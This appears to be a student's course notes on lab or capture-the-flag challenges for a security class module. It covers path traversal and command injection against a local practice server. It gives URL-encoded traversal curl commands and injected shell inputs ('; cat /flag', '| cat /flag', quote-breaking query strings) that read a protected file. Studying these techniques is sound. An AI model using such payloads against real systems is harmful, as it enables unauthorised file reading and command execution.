---
layout: default
title: Module 3
parent: CSE 365 Fall 2025
nav_order: 1
---

- [Path Traversal 1](#path-traversal-1)
- [Path Traversal 2](#path-traversal-2)
- [CMDi 1](#cmdi-1)
- [CMDi 2](#cmdi-2)
- [CMDi 3](#cmdi-3)
- [CMDi 4](#cmdi-4)
- [CMDi 5](#cmdi-5)

- **Cheat Sheets**
   - [HTML URL Encode](https://www.w3schools.com/tags//ref_urlencode.asp)
   - [Portswigger Learning Paths: Path Traversal](https://portswigger.net/web-security/learning-paths/path-traversal)

# Path Traversal 1
- The webserver program is at, `/challenge/server/repository`
   - Start the webserver, `/challenge/server`
   - The flag is located at, `/flag`
- `curl` the webserver, `curl -v http://challenge.localhost:80/repository/`
   - To get the flag with curl, `curl -v http://challenge.localhost:80/repository%2F%2E%2E%2F%2E%2E%2Fflag`
      - `%2F` -> `/`
      - `%2E` -> `.`
# Path Traversal 2
- The webserver program is at, `/challenge/server/assets`
   - Start the webserver, `/challenge/server`
   - The flag is located at, `/flag`
   - The main URL is, `http://challenge.localhost:80/assets`
   - The main URL gives three URL files, ...
      - `http://challenge.localhost/assets/fortunes/fortune-1.txt`
      - `http://challenge.localhost/assets/fortunes/fortune-2.txt`
      - `http://challenge.localhost/assets/fortunes/fortune-3.txt`
   - Trying, ... `http://challenge.localhost/assets/fortunes/%2E%2E%2F%2E%2E%2F%2E%2E%2Fflag`
# CMDi 1
- The webserver program is at, `/challenge/server/serve`
   - Message, **Output of ls -l /challenge:**
   - Sending, `;` Output, **Output of ls -l ;:**
   - The message is showing linux commands, try to use the `cat` command.
      - Sending, `; cat /flag` Output, **flag!**
# CMDi 2
Note: Many developers are aware of things like command injection, and try to prevent it. In this level, you may not use `;`!
- Use `|` instead, `| cat /flag`
# CMDi 3
- The webserver program is at, `http://challenge.localhost/checkpoint`
   - `http://challenge.localhost/checkpoint?path=%27%3Bcat+%27%2Fflag`
      - `%27` -> `'`
      - `%3B` - > `;`
      - `cat+`
      - `%27` -> `'`
      - `%2F` -> `/`
      - `flag`
# CMDi 4
- The webserver program is at, `http://challenge.localhost/step`
- The website is asking for a timezone
   - Code, `command = f"TZ={arg} date"`
      - Python, `command = f"Linux-Code"`
      - Linux, `TZ={arg} date`
   - Brake the Linux code, `;cat /flag;`
      - `TZ={` + `arg` + `} date`
      - `TZ={` + `;` + `cat /flag` + `;` + `} date`
# CMDi 5
Note: Attacking blind
- The webserver program is at, `http://challenge.localhost/puzzle`
- Webserver message, ** Welcome to the touch service! Please choose a file to touch: **
   - Code, `command = f"touch {arg}"`
      - Python, `command = f"Linux-Code"`
      - Linux, `touch {arg}`